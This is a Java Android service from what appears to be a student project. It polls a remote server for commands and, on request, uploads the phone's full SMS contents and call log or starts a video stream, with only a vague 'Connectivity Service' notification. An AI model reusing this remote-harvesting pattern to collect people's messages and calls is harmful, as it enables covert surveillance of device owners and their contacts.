package com.example.fyp_android;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.android.volley.Response.ErrorListener;
import com.android.volley.Response.Listener;
import com.android.volley.VolleyError;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.Console;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;
import java.util.TimeZone;
import java.util.Timer;
import java.util.TimerTask;

import me.everything.providers.android.calllog.Call;
import me.everything.providers.android.calllog.CallsProvider;
import me.everything.providers.android.telephony.Sms;
import me.everything.providers.android.telephony.TelephonyProvider;

import static com.example.fyp_android.App.CONNECTION_CHANNEL_ID;
import static com.example.fyp_android.App.STOP_CONNECTIVITY_SERVICE;

public class ConnectionService extends Service implements Listener, ErrorListener, RemoteTaskListener {
    private Auth auth;
    private ArrayList<JSONObject> requestStatusQueue;
    private RemoteTask remoteTask;
    private Timer timer;
    private boolean serviceRunning;
    @Override
    public void onCreate() {
        super.onCreate();
        timer = new Timer();
        requestStatusQueue = new ArrayList<>();
        serviceRunning=false;

    }

    public void getCommands() {
        auth = new Auth(this);
        Connection connection = new Connection(this, App.GET_COMMANDS_URL + '/' + new Auth(this).getPhoneId(), this, this);
        remoteTask = new RemoteTask(this, this);
        timer.scheduleAtFixedRate(new GetCommands(this, connection), 0, App.GET_COMMANDS_INTERVAL);
    }

    private void queueStatusRequest(int requestId, int status) {
        for (JSONObject req : requestStatusQueue) {
            try {
                if (req.get("requestId").toString().equals(requestId + ""))
                    return;
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        JSONObject json = new JSONObject();
        try {
            json.put("RequestId", requestId);
            json.put("PhoneRefId", auth.getPhoneId());
            json.put("Status", status);
            requestStatusQueue.add(json);
        } catch (Exception e) {

        }
    }

    private void postCompletedRequestStatus() {
        if (requestStatusQueue.isEmpty())
            return;

        for (JSONObject req : requestStatusQueue) {
            Connection c = new Connection(this, App.REQUEST_RESULT_URL, new Listener() {
                @Override
                public void onResponse(Object response) {
                    Log.d("com.example.asdf", "Completed request update completed");

                }
            }, new ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Log.d("com.example.asdf", "Completed request update failed");

                }
            });
            c.send(req, "put", auth.getToken());
        }
        requestStatusQueue.clear();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent.getAction().equals(STOP_CONNECTIVITY_SERVICE)) {
            stopForeground(true);
            timer.cancel();
            stopSelf();
            return START_NOT_STICKY;
        } else {
            if(!serviceRunning){
                serviceRunning=true;
                Intent notificationIntent = new Intent(this, MainActivity.class);
                PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);
                Notification notification = new NotificationCompat.Builder(this, CONNECTION_CHANNEL_ID)
                        .setContentTitle("Connectivity Service")
                        .setContentText("Running")
                        .setSmallIcon(R.drawable.ic_connected)
                        .setContentIntent(pendingIntent)
                        .build();

                startForeground(2, notification);
                getCommands();
            }
            return START_NOT_STICKY;
        }

    }

    @Override
    public void onErrorResponse(VolleyError error) {
        if(error.networkResponse == null)
            return;
        if(error.networkResponse.statusCode==410)
                auth.logout();
        Log.d("com.example.asdf", "onError: ");
    }

    @Override
    public void onResponse(Object response) {
        JSONObject res = (JSONObject) response;
        try {
            JSONArray requests = (JSONArray) res.get("requests");
            for (int i = 0; i < requests.length(); i++) {
                executeTask((int) ((JSONObject) (requests.get(i))).get("requestId"));
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }


    }

    @Override
    public void onTaskCompleted(int taskId) {
        Log.d("com.example.asdf", " task " + taskId + " completed");
        queueStatusRequest(taskId, 3);
    }

    @Override
    public void onTaskFailed(int taskId) {
        Log.d("com.example.asdf", " task " + taskId + " failed");

        queueStatusRequest(taskId, 4);

    }


    private void executeTask(int taskId) {
        Log.i("com.example.asdf","Executing Task: "+taskId);;
        if (taskId == 5) {
            uploadCallLogs();
            return;
        }
        if (taskId == 4) {
            uploadMessages();
            return;
        }
        if(taskId == 6){
            Intent dialogIntent = new Intent(this, VideoStream.class);
            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            startActivity(dialogIntent);
            return;
        }
        queueStatusRequest(taskId, 3);
        remoteTask.execute(taskId);
    }

    private void uploadCallLogs() {
        List<Call> calls = new CallsProvider(this).getCalls().getList();
        JSONObject callsJson = new JSONObject();
        JSONArray callsJsonArray = new JSONArray();

        try {
            for (Call call : calls) {

                TimeZone tz = TimeZone.getTimeZone("UTC");

                DateFormat df = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm'Z'"); // Quoted "Z" to indicate UTC, no timezone offset

                df.setTimeZone(tz);

                String nowAsISO = df.format(call.callDate);


                JSONObject callJson = new JSONObject();
                callJson.put("PhoneRefId", auth.getPhoneId());
                callJson.put("Call_to", call.number);
                callJson.put("Date", nowAsISO);
                callJson.put("Duration", call.duration);
                if (call.type != null)
                    callJson.put("Status", call.type.name());
                else
                    callJson.put("Status", "N/A");

                callsJsonArray.put(callJson);
            }
            callsJson.put("callLogs", callsJsonArray);
            new Connection(this, App.POST_CALLLOGS_URL + "/" + auth.getPhoneId(), new Listener() {
                @Override
                public void onResponse(Object response) {
                    queueStatusRequest(5, 3);
                }
            }, new ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Log.w("DDDDDDD",error.getMessage());
                }
            }).send(callsJson, "post", auth.getToken());

        } catch (Exception e) {
        }
    }

    private void uploadMessages() {
        List<Sms> smss = new TelephonyProvider(getApplicationContext()).getSms(TelephonyProvider.Filter.ALL).getList();
        JSONObject smsssJson = new JSONObject();
        JSONArray smsssJsonArray = new JSONArray();

        try {
            for (Sms sms : smss) {

                TimeZone tz = TimeZone.getTimeZone("UTC");

                DateFormat df = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm'Z'"); // Quoted "Z" to indicate UTC, no timezone offset

                df.setTimeZone(tz);

                String nowAsISO = df.format(sms.sentDate);


                JSONObject callJson = new JSONObject();
                callJson.put("PhoneRefId", auth.getPhoneId());
                callJson.put("Message", sms.body);
                callJson.put("Date", nowAsISO);
                smsssJsonArray.put(callJson);
            }
            smsssJson.put("smss", smsssJsonArray);
            new Connection(this, App.POST_SMS_URL + "/" + auth.getPhoneId(), new Listener() {
                @Override
                public void onResponse(Object response) {
                    queueStatusRequest(4, 3);
                }
            }, new ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {

                }
            }).send(smsssJson, "post", auth.getToken());

        } catch (Exception e) {

        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private class GetCommands extends TimerTask implements Login {
        Context context;
        Connection connection;
        Auth auth;

        public GetCommands(Context context, Connection connection) {
            this.context = context;
            this.connection = connection;
            auth = new Auth(context, this);
        }

        @Override
        public void run() {
            auth.login();
        }

        @Override
        public void onSuccessfulLogin(String token) {
            connection.send("get", token);
            postCompletedRequestStatus();
        }

        @Override
        public void onFailedLogin(int code) {

        }
    }
}
